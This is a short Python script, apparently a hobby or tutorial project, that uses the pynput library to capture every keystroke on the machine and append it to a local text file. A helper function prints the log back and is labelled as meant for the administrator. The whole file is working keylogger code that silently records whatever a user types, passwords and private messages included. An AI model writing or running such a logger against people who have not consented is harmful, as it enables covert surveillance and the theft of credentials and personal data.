# stores a user's keystrokes in a local text file
# imports
from pynput.keyboard import Listener
file_name = 'usr_log.txt'


# appends the user's keystrokes to a local text file
def append_to_log(keystrokes):
    # formats keystrokes into a more readable string
    keystroke_data = str(keystrokes)

    # remove quotation marks around keystrokes
    keystroke_data = keystroke_data.replace("'", "")

    # dictionary of key we don't want recorded(i.e every time the user shifts or backspaces)
    bad_keys = ['Key.shift', 'Key.backspace', 'Key.shift_r', 'Key.alt_l', 'Key.ctrl_l', 'Key.tab']

    # checks keystrokes against the dictionary of 'bad characters'
    for x in bad_keys:
        # if the keystrokes matches a value in the dictionary...
        if keystroke_data == str(x):
            # replace it with nothing
            keystroke_data = ""

    # replaces the name of the key with an actual space
    if keystroke_data == 'Key.space':
        keystroke_data = ' '

    # replaces the name of the key with an actual newline
    if keystroke_data == 'Key.enter':
        keystroke_data = '\n'

    # opens text file in append mode
    with open(file_name, 'a') as file_a:
        # appends keystrokes to the text file
        file_a.write(keystroke_data)


# reads from a local text file(meant for admin only)
def read_from_log(file):
    # reads from a local text file called 'usr_log'
    with open(file, 'r') as file_r:
        # creates a variable for the contents of the text file
        file_data = file_r.read()
        # prints the contents of the text file
        print(file_data)


# listens for keyboard presses
# on press, run the 'append_to_log' function
with Listener(on_press=append_to_log) as key_l:
    # join the keys together(for formatting reasons)
    key_l.join()
